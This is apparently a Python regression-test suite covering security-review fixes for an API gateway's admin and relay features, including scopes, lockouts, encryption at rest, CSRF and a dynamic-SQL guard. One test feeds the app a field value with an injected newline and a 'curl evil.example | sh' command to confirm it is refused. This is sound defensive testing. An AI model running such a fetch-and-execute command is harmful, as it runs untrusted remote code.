"""Regression tests for the security review fixes (one block per finding, labelled as in the review)."""
import ast
import json
import sqlite3
import threading
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.config import Settings
from app.services.telegram_commands import render
from tests.conftest import ADMIN, ADMIN_PASSWORD, BOT_TOKEN, PASSPHRASE, bearer, do_login, do_setup, new_key
from tests.test_generic import BASE, TOKEN, call, todo  # noqa: F401 - fixture

ROOT = Path(__file__).parent.parent


def db_bytes(settings) -> bytes:
    return b"".join(p.read_bytes() for p in Path(settings.database_path).parent.glob("gateway.sqlite3*"))


def any_query_service(admin, upstream):
    """Service 'tasks' with op 'add': any query field, body {project_id, content}, scoped on project_id."""
    sid = admin.post(f"{ADMIN}/services", json={"name": "tasks", "base_url": "https://t.example.com"}).json()["id"]
    admin.put(f"{ADMIN}/services/{sid}/credential", json={"credential": "cred-123"})
    r = admin.post(f"{ADMIN}/services/{sid}/operations", json={
        "name": "add", "method": "POST", "path_template": "/tasks", "query_fields": None,
        "body_fields": ["project_id", "content"], "scope_fields": ["project_id"]})
    assert r.status_code == 200, r.text
    upstream.add("POST", "https://t.example.com/tasks", {"id": "t1"})
    return sid


# -- H1: a scope field is checked in every place the caller put it -----------------------------------------
def test_h1_second_copy_of_scope_field_is_checked(admin, upstream):
    any_query_service(admin, upstream)
    k = new_key(admin, grants={"tasks.add": {"project_id": ["p1"]}})
    r = call(admin, k, "add", svc="tasks", query={"project_id": "p1"}, body={"project_id": "p2", "content": "x"})
    assert r.status_code == 403
    r = call(admin, k, "add", svc="tasks", query={"project_id": ["p1", "p2"]}, body={"project_id": "p1"})
    assert r.status_code == 403
    assert upstream.requests == []
    r = call(admin, k, "add", svc="tasks", query={"project_id": "p1"}, body={"project_id": "p1", "content": "x"})
    assert r.status_code == 200


def test_h1_scope_field_declared_twice_refused(admin):
    sid = admin.post(f"{ADMIN}/services", json={"name": "s", "base_url": "https://s.example.com"}).json()["id"]
    r = admin.post(f"{ADMIN}/services/{sid}/operations", json={
        "name": "op", "method": "POST", "path_template": "/x", "query_fields": ["project_id"],
        "body_fields": ["project_id"], "scope_fields": ["project_id"]})
    assert r.status_code == 400 and "more than one" in r.json()["detail"]


# -- H2: removing a scope field never turns a limited grant into an unlimited one ---------------------------
def test_h2_removing_scope_field_in_use_refused(todo, upstream):
    upstream.add("GET", f"{BASE}/tasks", {"results": []})
    k = new_key(todo, "limited", grants={"todoist.tasks_list": {"project_id": ["p1"]}})
    op = next(o for o in todo.get(f"{ADMIN}/services/{todo.svc_id}/operations").json()["operations"]
              if o["name"] == "tasks_list")
    r = todo.patch(f"{ADMIN}/operations/{op['id']}", json={"scope_fields": []})
    assert r.status_code == 409 and r.json()["error"] == "scope_in_use" and "limited" in r.json()["detail"]
    assert call(todo, k, "tasks_list", query={"project_id": "p2"}).status_code == 403
    # once the limit is gone, the field may go
    key_id = todo.get(f"{ADMIN}/keys").json()["keys"][0]["id"]
    todo.put(f"{ADMIN}/permissions/{key_id}/todoist.tasks_list", json={"scope": None})
    assert todo.patch(f"{ADMIN}/operations/{op['id']}", json={"scope_fields": []}).status_code == 200


# -- H3: one attempt at a time per counter (each costs a large scrypt) ----------------------------------------
def test_h3_parallel_login_refused_while_one_runs(unsealed):
    gate = unsealed.app.state.gw.admin_auth.lockout.gate
    with gate:  # an attempt is running
        r = unsealed.post(f"{ADMIN}/login", json={"password": "wrong-password"})
    assert r.status_code == 429 and r.json()["error"] == "busy"
    assert unsealed.app.state.gw.admin_auth.lockout.failures == 0  # not counted, not hashed
    assert unsealed.post(f"{ADMIN}/login", json={"password": ADMIN_PASSWORD}).status_code == 200


def test_h3_parallel_unlock_refused_while_one_runs(make_app):
    with TestClient(make_app()) as c:
        do_setup(c)
    with TestClient(make_app()) as c:
        with c.app.state.gw.unlock_lockout.gate:
            r = c.post(f"{ADMIN}/unlock", json={"passphrase": PASSPHRASE})
        assert r.status_code == 429 and r.json()["error"] == "busy"
        assert c.post(f"{ADMIN}/unlock", json={"passphrase": PASSPHRASE}).status_code == 200


def test_h3_concurrent_logins_hash_one_at_a_time(unsealed, monkeypatch):
    import app.crypto as crypto
    running, peak, lock = [0], [0], threading.Lock()
    real = crypto.verify_password

    def slow_verify(*a):
        with lock:
            running[0] += 1
            peak[0] = max(peak[0], running[0])
        try:
            threading.Event().wait(0.05)
            return real(*a)
        finally:
            with lock:
                running[0] -= 1

    monkeypatch.setattr(crypto, "verify_password", slow_verify)
    codes = []
    threads = [threading.Thread(target=lambda: codes.append(
        unsealed.post(f"{ADMIN}/login", json={"password": "wrong-password"}).status_code)) for _ in range(12)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert peak[0] == 1
    assert set(codes) <= {403, 429} and 403 in codes


# -- M2: the web cannot lock out unlock.sh; lockouts are capped short ----------------------------------------
def test_m2_web_lockout_does_not_block_unlock_sh(make_app, settings, clock):
    with TestClient(make_app()) as c:
        do_setup(c)
    with TestClient(make_app()) as c:
        for _ in range(12):
            c.post(f"{ADMIN}/unlock", json={"passphrase": "nope nope nope"})
            clock.advance(c.app.state.gw.unlock_lockout.retry_after())
        c.post(f"{ADMIN}/unlock", json={"passphrase": "nope nope nope"})
        r = c.post(f"{ADMIN}/unlock", json={"passphrase": PASSPHRASE})
        assert r.status_code == 429 and r.json()["retry_after"] <= 300
        token = Path(settings.unlock_token_path).read_text()
        r = c.post("/_unlock", json={"passphrase": PASSPHRASE}, headers={"X-Unlock-Token": token})
        assert r.status_code == 200 and r.json() == {"state": "unsealed"}


# -- M1 / L3: passphrase change ------------------------------------------------------------------------------
def test_m1_writes_during_passphrase_change_stay_readable(make_app, settings):
    with TestClient(make_app()) as c:
        do_setup(c)
        do_login(c)
        gw = c.app.state.gw
        stop = threading.Event()

        def writer():
            while not stop.is_set():
                gw.audit_event("test.write", "ok", "resource that must stay readable")

        t = threading.Thread(target=writer)
        t.start()
        try:
            for i in range(3):
                old, new = (PASSPHRASE, f"new passphrase {i}") if i == 0 else (f"new passphrase {i - 1}", f"new passphrase {i}")
                r = c.post(f"{ADMIN}/passphrase", json={"current": old, "new": new})
                assert r.status_code == 200, r.text
        finally:
            stop.set()
            t.join()
    with TestClient(make_app()) as c:  # restart: only the new key exists now
        assert c.post(f"{ADMIN}/unlock", json={"passphrase": "new passphrase 2"}).status_code == 200
        gw = c.app.state.gw
        rows = gw.conn.execute("SELECT resource_enc FROM audit WHERE action = 'test.write'").fetchall()
        assert len(rows) > 0
        assert {gw.vault.dec(r["resource_enc"]) for r in rows} == {"resource that must stay readable"}


def test_m1_unreadable_audit_row_does_not_break_the_page(admin):
    gw = admin.app.state.gw
    gw.conn.execute("INSERT INTO audit (ts, key_name, action, resource, resource_enc, status) VALUES"
                    " (1, '-', 'x', '', 'gAAAAAnot-a-valid-token', '200')")
    r = admin.get(f"{ADMIN}/audit", params={"action": "x"})
    assert r.status_code == 200 and r.json()["rows"][0]["resource"] == "(unreadable)"


def test_l3_old_ciphertext_gone_after_passphrase_change(todo, settings):
    gw = todo.app.state.gw
    before = gw.conn.execute("SELECT credential_enc FROM services WHERE id = ?", (todo.svc_id,)).fetchone()[0]
    assert before.encode() in db_bytes(settings)
    assert todo.post(f"{ADMIN}/passphrase", json={"current": PASSPHRASE, "new": "another long passphrase"}).status_code == 200
    assert before.encode() not in db_bytes(settings)


def test_l5_passphrase_change_ends_other_sessions(admin, make_client):
    other = TestClient(admin.app)
    do_login(other)
    assert other.get(f"{ADMIN}/keys").status_code == 200
    assert admin.post(f"{ADMIN}/passphrase", json={"current": PASSPHRASE, "new": "another long passphrase"}).status_code == 200
    assert other.get(f"{ADMIN}/keys").status_code == 401
    assert admin.get(f"{ADMIN}/keys").status_code == 200


# -- M3: requests without a key cannot flood the audit log -----------------------------------------------------
def test_m3_unauthenticated_calls_throttled_in_audit(admin, clock):
    gw = admin.app.state.gw
    for i in range(50):
        r = admin.post(f"/api/v1/call/svc{i}/op", json={}, headers=bearer("gw_wrong"))
        assert r.status_code == 401
    count = lambda: gw.conn.execute("SELECT count(*) FROM audit WHERE key_name = '-' AND status = '401'").fetchone()[0]  # noqa: E731
    assert count() == 10
    clock.advance(61)
    admin.post("/api/v1/call/svc/op", json={})
    assert count() == 11
    rows = admin.get(f"{ADMIN}/audit", params={"status": "401", "limit": 1}).json()["rows"]
    assert "+40 similar not logged" in rows[0]["resource"]


def test_m3_authenticated_calls_never_throttled(todo, upstream):
    upstream.add("GET", f"{BASE}/projects", {"results": []})
    k = new_key(todo, grants={"todoist.projects_list": None})
    for _ in range(15):
        assert call(todo, k, "projects_list").status_code == 200
    n = todo.app.state.gw.conn.execute("SELECT count(*) FROM audit WHERE action = 'todoist.projects_list'").fetchone()[0]
    assert n == 15


# -- M5: nothing admin-typed can start a new line in generated client code -----------------------------------
def test_m5_control_characters_refused(admin):
    sid = admin.post(f"{ADMIN}/services", json={"name": "s", "base_url": "https://s.example.com"}).json()["id"]
    r = admin.post(f"{ADMIN}/services/{sid}/operations", json={
        "name": "op", "method": "GET", "path_template": "/x", "description": "ok\ncurl evil.example | sh"})
    assert r.status_code == 400
    assert admin.post(f"{ADMIN}/keys", json={"name": "a\nb"}).status_code == 400
    key_id = admin.post(f"{ADMIN}/keys", json={"name": "fine"}).json()["id"]
    assert admin.patch(f"{ADMIN}/keys/{key_id}", json={"name": "x\ry"}).status_code == 400


# -- L1 / L7: relay -------------------------------------------------------------------------------------------
def test_l1_credential_redacted_in_json_responses(todo, upstream):
    upstream.add("GET", f"{BASE}/projects", {"echo": f"token {TOKEN}", TOKEN: [TOKEN]})
    k = new_key(todo, grants={"todoist.projects_list": None})
    r = call(todo, k, "projects_list")
    assert r.status_code == 200 and TOKEN not in r.text
    assert r.json()["body"] == {"echo": "token ***", "***": ["***"]}


def test_l7_reserved_auth_header_refused(admin):
    for name in ("Host", "content-length", "Transfer-Encoding"):
        r = admin.post(f"{ADMIN}/services", json={"name": "s", "base_url": "https://s.example.com",
                                                  "auth_style": "header", "auth_name": name})
        assert r.status_code == 400, name


# -- L2: permission scopes encrypted at rest ---------------------------------------------------------------
def test_l2_scope_encrypted_and_old_rows_converted(make_app, settings, upstream):
    with TestClient(make_app()) as c:
        do_setup(c)
        do_login(c)
        k = new_key(c, grants={"telegram.send": {"chat_ids": ["765432109"]}})
        assert b"765432109" not in db_bytes(settings)
        # a row as written before migration 0010
        key_id = c.get(f"{ADMIN}/keys").json()["keys"][0]["id"]
        c.app.state.gw.conn.execute("UPDATE permissions SET scope_json = ?, scope_enc = NULL WHERE key_id = ?",
                                    (json.dumps({"chat_ids": ["111222333"]}), key_id))
    assert b"111222333" in db_bytes(settings)
    with TestClient(make_app()) as c:
        assert c.post(f"{ADMIN}/unlock", json={"passphrase": PASSPHRASE}).status_code == 200
        do_login(c)
        grants = c.get(f"{ADMIN}/permissions").json()["grants"]
        assert grants[0]["scope"] == {"chat_ids": ["111222333"]}
        r = c.post("/api/v1/telegram/send", json={"bot": "b", "chat_id": 765432109, "text": "x"}, headers=bearer(k))
        assert r.status_code == 403  # still limited, to the converted value
    assert b"111222333" not in db_bytes(settings)
    conn = sqlite3.connect(settings.database_path)
    assert conn.execute("SELECT count(*) FROM permissions WHERE scope_json IS NOT NULL").fetchone()[0] == 0


# -- L4: ENV fails closed ---------------------------------------------------------------------------------------
def test_l4_env_defaults_to_production_and_rejects_typos():
    assert Settings.from_env({}).production
    assert Settings.from_env({"ENV": "Production"}).production
    with pytest.raises(RuntimeError):
        Settings.from_env({"ENV": "prod"}).validate()


# -- L5: sessions and password change ----------------------------------------------------------------------
def test_l5_session_absolute_lifetime(admin, clock):
    for _ in range(12 * 2):  # stay active: idle timeout never triggers
        clock.advance(30 * 60)
        assert admin.get(f"{ADMIN}/keys").status_code == 200
    clock.advance(30 * 60 + 1)
    assert admin.get(f"{ADMIN}/keys").status_code == 401


def test_l5_password_change_guesses_limited(admin):
    for _ in range(5):
        assert admin.post(f"{ADMIN}/password", json={"current": "guess-guess", "new": "new-password-123"}).status_code == 403
    r = admin.post(f"{ADMIN}/password", json={"current": ADMIN_PASSWORD, "new": "new-password-123"})
    assert r.status_code == 429 and r.json()["error"] == "locked"


# -- L8: reply templates do not interpret upstream data ----------------------------------------------------
def test_l8_upstream_text_not_expanded():
    data = {"body": {"secret": "S", "results": [{"content": "{body}"}, {"content": "{body.secret}"}]}}
    assert render("{#body.results}- {content}\n{/body.results}", data) == "- {body}\n- {body.secret}\n"
    assert render("{body.secret}: {#body.results}{content};{/body.results}", data) == "S: {body};{body.secret};"


# -- L10: headers and cross-site requests ---------------------------------------------------------------------
def test_l10_cross_site_login_refused(unsealed):
    r = unsealed.post(f"{ADMIN}/login", json={"password": ADMIN_PASSWORD}, headers={"Origin": "https://evil.example"})
    assert r.status_code == 403 and r.json()["error"] == "csrf"
    r = unsealed.post(f"{ADMIN}/login", json={"password": ADMIN_PASSWORD}, headers={"Origin": "null"})
    assert r.status_code == 403
    r = unsealed.post(f"{ADMIN}/login", json={"password": ADMIN_PASSWORD}, headers={"Origin": "http://testserver"})
    assert r.status_code == 200


def test_l10_admin_headers(make_client):
    dev = make_client()
    r = dev.get(f"{ADMIN}/state")
    assert "frame-ancestors 'none'" in r.headers["content-security-policy"]
    assert "strict-transport-security" not in r.headers
    prod = make_client(env="production")
    assert prod.get(f"{ADMIN}/state").headers["strict-transport-security"].startswith("max-age=")


# -- L11: bot renames and deletions follow into scopes --------------------------------------------------------
def test_l11_bot_rename_and_delete_update_scopes(admin):
    bot = admin.post(f"{ADMIN}/bots", json={"name": "alerts", "token": BOT_TOKEN, "polling_enabled": False}).json()["id"]
    new_key(admin, "a", grants={"telegram.send": {"bots": ["alerts"]}})
    new_key(admin, "b", grants={"telegram.read": {"bots": ["alerts", "other"]}})
    assert admin.patch(f"{ADMIN}/bots/{bot}", json={"name": "alarms"}).status_code == 200
    scopes = {(g["action"], json.dumps(g["scope"])) for g in admin.get(f"{ADMIN}/permissions").json()["grants"]}
    assert scopes == {("telegram.send", '{"bots": ["alarms"]}'), ("telegram.read", '{"bots": ["other", "alarms"]}')}
    assert admin.delete(f"{ADMIN}/bots/{bot}").status_code == 200
    grants = admin.get(f"{ADMIN}/permissions").json()["grants"]
    assert [(g["action"], g["scope"]) for g in grants] == [("telegram.read", {"bots": ["other"]})]  # 'a' grant gone


# -- L9 -------------------------------------------------------------------------------------------------------
def test_l9_unlock_sh_keeps_passphrase_whitespace():
    assert "IFS= read -r PASS" in (ROOT / "unlock.sh").read_text()


# -- SQL injection guard ------------------------------------------------------------------------------------
# Every query whose text is not a plain string literal, by (file, enclosing function). Each one builds its SQL only
# from fixed table/column names or fixed "col = ?" fragments; values always go in as ? parameters. A new entry
# here needs the same review: never put request data into the SQL text.
DYNAMIC_SQL = {
    ("app/admin_access.py", "audit"),              # WHERE from a fixed list of (column, operator) pairs
    ("app/db.py", "execute"),                      # the Connection wrapper itself
    ("app/db.py", "migrate"),                      # statements from app/migrations/*.sql
    ("app/seal.py", "_reencrypt"),                 # table/column names from crypto.ENCRYPTED_COLUMNS
    ("app/services/generic.py", "rename_actions"),  # table name from a fixed tuple
    ("app/services/generic.py", "patch_operation"),  # table name from a fixed tuple
    ("app/services/telegram.py", "patch_bot"),      # fixed "col = ?" fragments
    ("app/services/telegram_poll.py", "list_messages"),  # fixed "col = ?" fragments
}


def test_sql_text_is_never_built_from_data():
    found = set()
    for f in sorted((ROOT / "app").rglob("*.py")):
        stack: list[str] = []

        class Visit(ast.NodeVisitor):
            def visit_FunctionDef(self, n):
                stack.append(n.name)
                self.generic_visit(n)
                stack.pop()

            visit_AsyncFunctionDef = visit_FunctionDef

            def visit_Call(self, n):
                if isinstance(n.func, ast.Attribute) and n.func.attr in ("execute", "executemany", "executescript") \
                        and n.args and not (isinstance(n.args[0], ast.Constant) and isinstance(n.args[0].value, str)):
                    found.add((str(f.relative_to(ROOT)), stack[-1] if stack else "<module>"))
                self.generic_visit(n)

        Visit().visit(ast.parse(f.read_text()))
    assert found == DYNAMIC_SQL, "new or removed dynamic SQL: review it, then update DYNAMIC_SQL"
